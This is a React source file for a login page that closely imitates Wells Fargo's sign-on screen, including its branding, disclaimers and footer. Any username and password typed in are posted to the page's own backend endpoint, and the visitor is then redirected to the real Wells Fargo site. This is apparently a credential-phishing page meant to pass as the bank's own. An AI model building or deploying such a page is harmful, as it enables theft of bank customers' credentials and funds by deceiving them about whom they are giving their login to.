import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Card, CardContent } from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { X, Search, Key } from "lucide-react";
import { Link, useLocation } from "wouter";
import heroBg from "@/assets/images/hero-bg.jpg";

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
  saveUsername: z.boolean().default(false),
});

type LoginFormData = z.infer<typeof loginSchema>;

function getGreeting(): string {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 18) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [greeting, setGreeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    const interval = setInterval(() => {
      setGreeting(getGreeting());
    }, 60000);
    return () => clearInterval(interval);
  }, []);

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      saveUsername: false,
    },
  });

  const usernameValue = form.watch("username");

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Sign On Successful",
        description: "Redirecting to Wells Fargo...",
      });
      setTimeout(() => {
        window.location.href = "https://www.wellsfargo.com/";
      }, 1000);
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password.",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };

  const clearUsername = () => {
    form.setValue("username", "");
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* Red header bar */}
      <header className="bg-[#d71e28] text-white">
        <div className="max-w-7xl mx-auto px-4 py-2">
          <div className="flex items-center justify-between">
            <span
              className="text-lg font-bold tracking-wide"
              data-testid="text-logo"
            >
              WELLS FARGO
            </span>

            <nav className="flex items-center gap-4 text-xs">
              <a
                href="#"
                className="flex items-center gap-1 hover:underline"
                data-testid="link-enroll"
              >
                <span className="hidden sm:inline">Enroll</span>
              </a>
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-customer-service"
              >
                Customer Service
              </a>
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-atm-locations"
              >
                ATMs/Locations
              </a>
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-espanol"
              >
                Español
              </a>
              <div className="flex items-center gap-2">
                <span className="text-xs border border-white/50 px-2 py-0.5 rounded hidden sm:inline">
                  Search
                </span>
                <Search className="w-4 h-4" />
              </div>
            </nav>
          </div>
        </div>
      </header>

      {/* Yellow accent bar */}
      <div className="bg-[#ffcd41] h-1"></div>

      {/* Main content with background */}
      <main
        className="flex-1 relative"
        style={{
          backgroundImage: `url(${heroBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center bottom",
        }}
      >
        <div className="max-w-md mx-auto px-4 py-8">
          {/* Login Card */}
          <Card
            className="shadow-lg border-0 bg-white"
            data-testid="card-login"
          >
            <CardContent className="p-6 sm:p-8">
              <h1
                className="text-2xl text-center text-gray-800 mb-6 font-normal"
                data-testid="text-greeting"
              >
                {greeting}
              </h1>

              <Form {...form}>
                <form
                  onSubmit={form.handleSubmit(onSubmit)}
                  className="space-y-4"
                >
                  <FormField
                    control={form.control}
                    name="username"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <div className="relative">
                            <Input
                              placeholder="Username"
                              className="h-12 pr-10 border-gray-300 rounded-sm text-base"
                              data-testid="input-username"
                              {...field}
                            />
                            {usernameValue && (
                              <button
                                type="button"
                                onClick={clearUsername}
                                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                                data-testid="button-clear-username"
                              >
                                <X className="w-5 h-5" />
                              </button>
                            )}
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="password"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <div className="relative">
                            <Input
                              type={showPassword ? "text" : "password"}
                              placeholder="Password"
                              className="h-12 pr-16 border-gray-300 rounded-sm text-base"
                              data-testid="input-password"
                              {...field}
                            />
                            <button
                              type="button"
                              onClick={() => setShowPassword(!showPassword)}
                              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#d71e28] text-sm font-medium hover:underline"
                              data-testid="button-toggle-password"
                            >
                              {showPassword ? "Hide" : "Show"}
                            </button>
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="saveUsername"
                    render={({ field }) => (
                      <FormItem>
                        <div className="flex items-start gap-2">
                          <FormControl>
                            <Checkbox
                              checked={field.value}
                              onCheckedChange={field.onChange}
                              className="mt-0.5 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
                              data-testid="checkbox-save-username"
                            />
                          </FormControl>
                          <div className="text-sm">
                            <label className="text-gray-800 font-medium cursor-pointer">
                              Save username
                            </label>
                            <p className="text-gray-500 text-xs mt-0.5">
                              To help keep your account secure, save your
                              username only on devices that aren't used by other
                              people.
                            </p>
                          </div>
                        </div>
                      </FormItem>
                    )}
                  />

                  <div className="pt-2">
                    <Button
                      type="submit"
                      className="w-full h-11 bg-gray-200 hover:bg-gray-300 text-gray-700 font-medium rounded-full border border-gray-300"
                      variant="ghost"
                      disabled={loginMutation.isPending}
                      data-testid="button-sign-on"
                    >
                      {loginMutation.isPending ? "Signing on..." : "Sign on"}
                    </Button>
                  </div>

                  <div className="flex items-center justify-center gap-2 text-gray-500 text-sm py-1">
                    <span>or</span>
                  </div>

                  <Button
                    type="button"
                    variant="outline"
                    className="w-full h-11 rounded-full border-gray-800 text-gray-800 font-medium"
                    data-testid="button-passkey"
                  >
                    <Key className="w-4 h-4 mr-2" />
                    Use a passkey
                  </Button>

                  <p className="text-xs text-gray-500 text-center pt-1">
                    Don't have one? Create a passkey after signing on and skip
                    the password next time.
                  </p>
                </form>
              </Form>

              <div className="mt-4 text-center">
                <Link
                  href="/forgot-password"
                  className="text-[#d71e28] text-sm hover:underline inline-flex items-center gap-1"
                  data-testid="link-forgot"
                >
                  <span className="text-lg">→</span>
                  Forgot username or password?
                </Link>
              </div>

              <div className="mt-3 pt-3 border-t border-gray-200 text-center">
                <p className="text-sm text-gray-600 mb-2">Don't have an account?</p>
                <Link
                  href="/register"
                  className="text-[#d71e28] text-sm font-medium hover:underline"
                  data-testid="link-register"
                >
                  Enroll Now
                </Link>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Disclaimer Card */}
        <div className="max-w-2xl mx-auto px-4 pb-8">
          <Card className="shadow-md border-0 bg-white">
            <CardContent className="p-5">
              <h3
                className="font-bold text-gray-800 text-sm mb-3"
                data-testid="text-disclaimer-title"
              >
                Investment and Insurance Products are:
              </h3>
              <ul className="space-y-1 text-sm text-gray-700 list-disc list-inside">
                <li>Not Insured by the FDIC or Any Federal Government Agency</li>
                <li>
                  Not a Deposit or Other Obligation of, or Guaranteed by, the
                  Bank or Any Bank Affiliate
                </li>
                <li>
                  Subject to Investment Risks, Including Possible Loss of the
                  Principal Amount Invested
                </li>
              </ul>
              <p className="text-xs text-gray-500 mt-4">
                Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
              </p>
            </CardContent>
          </Card>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-200 py-4">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-gray-600 mb-3">
            <a href="#" className="hover:underline" data-testid="link-about">
              About Wells Fargo
            </a>
            <span className="text-gray-300">|</span>
            <a
              href="#"
              className="hover:underline"
              data-testid="link-online-access"
            >
              Online Access Agreement
            </a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline" data-testid="link-privacy">
              Privacy, Cookies, Security & Legal
            </a>
            <span className="text-gray-300">|</span>
            <a
              href="#"
              className="hover:underline"
              data-testid="link-do-not-sell"
            >
              Do not sell or share my personal information
            </a>
          </div>
          <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-gray-600 mb-3">
            <a
              href="#"
              className="hover:underline"
              data-testid="link-notice-data"
            >
              Notice of Data Collection
            </a>
            <span className="text-gray-300">|</span>
            <a
              href="#"
              className="hover:underline"
              data-testid="link-report-fraud"
            >
              Report Email Fraud
            </a>
            <span className="text-gray-300">|</span>
            <a
              href="#"
              className="hover:underline"
              data-testid="link-security-center"
            >
              Security Center
            </a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline" data-testid="link-sitemap">
              Sitemap
            </a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:underline" data-testid="link-feedback">
              Give Us Feedback
            </a>
          </div>
          <p
            className="text-xs text-gray-500 text-center"
            data-testid="text-copyright"
          >
            © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801.
          </p>
        </div>
      </footer>
    </div>
  );
}
